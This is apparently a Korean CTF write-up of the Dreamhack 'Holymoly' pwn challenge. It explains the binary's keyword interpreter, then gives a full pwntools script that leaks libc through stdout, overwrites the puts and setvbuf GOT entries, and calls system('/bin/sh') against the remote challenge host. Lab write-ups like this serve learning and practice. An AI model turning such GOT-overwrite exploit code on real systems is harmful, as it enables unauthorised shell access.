---
title: Dreamhack - Holymoly
date: 2025-03-26 15:45:01 +0900
categories: [Labs, Dreamhack]
---

기본적으로 코드가 주어진다.

main에서 취약한 것으로 보이는 함수는 Interpret 이다.

이 함수를 분석해보면 우리가 입력한 문자열이 위치한 포인터를 인자로 받고, 그걸 반복문을 돌면서 검사한다. 

이 함수의 내용은 다음과 같다.

id를 parse함수의 반환값으로 하고, id가 invalid_id 면 반환, 아니라면 procesphraseid를 호출한다. 그리고 phrase 배열에서 id를 인덱스로 하여 len을 가져와서 ptr에 더한다.

여기서 우리는 반복을 통해 우리가 준 입력을 인자로 계속 루프를 돌며 함수를 호출하기에 이 부분을 활용해야한다고 생각한다.

parse함수는 phrase 구조체의 멤버 개수 만큼 반복문을 돌면서 memcmp했을 때 같다면 id를 반환한다.

그리고 이렇게 반환 받은 id로 ProcessPhraseId 함수를 호출한다.

id가 0 ~ 3 이면 Increase 함수를

4 ~ 7 이면 Decrease 함수를,

8이면 Read를,

9번 Write를

10이면 OperateSwitch 함수를 호출한다.

일단 libc 릭을 시도해보자.

no_pie 라 stdout의 주소는 고정되어 있다. 이 주소를 ptr에 할당해주면 Read함수에서 이 주소에 들어있는 _IO_2_1_stdout_의 값을 출력해 libc base를 계산할 수 있을 것이다.

이후 코드를 작성하여 시도해봤지만 스택 정렬이 자꾸 깨진다.. 하지만 스택을 정렬할만한 수단이 없어보인다.

이후 (uint64_t *)((uint8_t *)ptr + amount) 이거 때문에 다른 영역을 침범해서 그 영역에 있던 함수들을 호출할 때 오류가 발생한다는 것을 알았다. 

그렇다면 더 이상 호출하지 않는 함수나 빈 공간과 붙어있는 함수 중 우리가 쓸 수 있는 함수를 찾아보자 scanf는 덮을 수 있지만 인자를 조작하기 힘들어 보이고, puts는 문자열이 위치한 곳의 권한을 보니 쓰기 권한이 없어 수정이 불가능하다. setvbuf가 적당해 보인다.

그렇다면 인자는 어떻게 설정할까? setvbuf의 첫 번째 인자는 stdin, stdout 같은 것이고, 우리는 이들의 주소를 알기 때문에 여기에 binsh 문자열의 주소를 넣을 수 있다.

총 2번의 입력이 필요하기 때문에 puts의 got를 main으로 바꿔주었다.

```python
from pwn import *

context.log_level = "DEBUG"

# p = process("./holymoly_patched")
p = remote("host3.dreamhack.games", 15587)
e = ELF("./holymoly_patched")
libc = ELF("./libc-2.31.so")

# gdb.attach(p)
# main = 0x4011fa
#Write = 0x401561

#libc leak
payload = "mystery"
payload += "holymoly"*0x404
payload += "monopoly"*8
payload += "blueberry"
#puts got -> main
payload += "broccoli"*6
payload += "bordercollie"*8
payload += "mystery"
payload += "holymoly"*0x401
payload += "rolypoly"
payload += "monopoly"*0xf
payload += "guacamole"*0xa
payload += "cranberry"
p.sendlineafter(b"holymoly? ",payload)

leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))
base = leak - libc.symbols['_IO_2_1_stdout_']
system = str(hex(base + libc.symbols['system']))
binsh = str(hex(base + next(libc.search(b"/bin/sh"))))

log.info(f"Base : {hex(base)}")
log.info(f"System : {system}")
log.info(f"binsh : {binsh}")

s = [int(system[i],16) for i in range(2,len(system))]
b = [int(binsh[i],16) for i in range(2,len(binsh))]

#setvbuf got(0x404040) -> system, stdout(0x404080) -> binsh addr
payload = "mystery" #ptr mode
payload += "holymoly"*0x404
payload += "monopoly" * 4

payload += "mystery" #val mode
payload += "holymoly"*s[-4] + "rolypoly"*s[-3] + "monopoly"*s[-2] + "guacamole"*s[-1] # val -> system 하위 2바이트
payload += "cranberry" #ptr -> system 하위 2바이트 
payload += "robocarpoli"*s[-4] + "halligalli"*s[-3] + "broccoli"*s[-2] + "bordercollie"*s[-1] #val -> 0

payload += "mystery" #ptr mode
payload += "guacamole"*2 #ptr + 2
payload += "mystery" #val mode
payload += "holymoly"*s[-8] + "rolypoly"*s[-7] + "monopoly"*s[-6] + "guacamole"*s[-5] #val -> system 중간 2바이트
payload += "cranberry" #ptr -> system 중간 2바이트
payload += "robocarpoli"*s[-8] + "halligalli"*s[-7] + "broccoli"*s[-6] + "bordercollie"*s[-5] #val -> 0

payload += "mystery" #ptr mode
payload += "guacamole"*2 #ptr + 2 
payload += "mystery" #val mode
payload += "holymoly"*s[-12] + "rolypoly"*s[-11] + "monopoly"*s[-10] + "guacamole"*s[-9] #val -> system 상위 2바이트
payload += "cranberry" #ptr -> system 상위 2바이트
payload += "robocarpoli"*s[-12] + "halligalli"*s[-11] + "broccoli"*s[-10] + "bordercollie"*s[-9] #val -> 0

#ptr : 0x404044 -> 0x404080 , + 0x3c
payload += "mystery" # ptr mode
payload += "monopoly"*3
payload += "guacamole"*0xc

payload += "mystery" #val mode
payload += "holymoly"*b[-4] + "rolypoly"*b[-3] + "monopoly"*b[-2] + "guacamole"*b[-1] # val -> binsh 하위 2바이트
payload += "cranberry" #ptr -> binsh 하위 2바이트
payload += "robocarpoli"*b[-4] + "halligalli"*b[-3] + "broccoli"*b[-2] + "bordercollie"*b[-1] #val -> 0

payload += "mystery" #ptr mode
payload += "guacamole"*2
payload += "mystery" #val mode
payload += "holymoly"*b[-8] + "rolypoly"*b[-7] + "monopoly"*b[-6] + "guacamole"*b[-5] # val -> binsh 중간 2바이트
payload += "cranberry" #ptr -> binsh 중간 2바이트
payload += "robocarpoli"*b[-8] + "halligalli"*b[-7] + "broccoli"*b[-6] + "bordercollie"*b[-5] #val -> 0

payload += "mystery" #ptr mode
payload += "guacamole"*2
payload += "mystery" #val mode
payload += "holymoly"*b[-12] + "rolypoly"*b[-11] + "monopoly"*b[-10] + "guacamole"*b[-9] # val -> binsh 상위 2바이트
payload += "cranberry"

p.sendlineafter(b"holymoly? ",payload)

p.interactive()

```